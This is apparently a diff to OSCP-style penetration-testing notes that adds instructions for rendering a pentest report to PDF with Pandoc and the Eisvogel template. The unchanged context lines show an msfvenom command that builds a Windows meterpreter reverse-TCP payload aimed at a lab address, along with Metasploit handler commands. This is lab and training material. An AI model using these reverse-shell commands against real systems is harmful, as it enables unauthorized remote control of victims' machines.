@@ -58,3 +58,23 @@ $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.40 LPORT=4444 -f as
 msf > use exploit/multi/handler
 msf > set payload windows/meterpreter/reverse_tcp
 ```
+# Pen Test Report
+#### Requirements
+
+- [Pandoc](https://pandoc.org/installing.html)
+```
+sudo apt-get install pandoc
+```
+- LaTeX (eg. [TeX Live](http://www.tug.org/texlive/)) in order to get `pdflatex` or `xelatex`
+- [Eisvogel Pandoc LaTeX PDF Template](https://github.com/Wandmalfarbe/pandoc-latex-template#installation)
+```
+pandoc PENTEST_REPORT.md \
+-o OSCP-OS-XXXXX-Lab-Report.pdf \
+--from markdown+yaml_metadata_block+raw_html \
+--template eisvogel \
+--table-of-contents \
+--toc-depth 6 \
+--number-sections \
+--top-level-division=chapter \
+--highlight-style breezedark
+```
